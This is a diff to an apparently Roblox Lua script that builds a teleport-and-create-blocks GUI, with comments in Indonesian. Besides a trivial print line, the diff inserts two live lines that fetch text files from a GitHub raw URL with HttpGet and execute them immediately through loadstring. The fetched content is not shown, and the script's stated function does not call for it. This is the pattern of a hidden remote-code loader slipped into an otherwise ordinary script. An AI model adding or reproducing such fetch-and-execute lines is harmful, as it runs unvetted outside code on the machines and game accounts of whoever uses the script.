@@ -29,6 +29,9 @@ teleportAndCreateBlockButton.Text = "Teleport & Create Blocks"
 teleportAndCreateBlockButton.TextScaled = true
 teleportAndCreateBlockButton.Parent = frame
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/gefop.txt"))() 
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/creditgef.txt"))()
+
 -- Variabel untuk menyimpan posisi awal dan status teleportasi
 local initialPosition
 local isTeleported = false
@@ -109,3 +112,4 @@ end
 -- Hubungkan fungsi ke button
 teleportButton.MouseButton1Click:Connect(toggleTeleport)
 teleportAndCreateBlockButton.MouseButton1Click:Connect(teleportAndCreateBlock)
+print("Hello!")
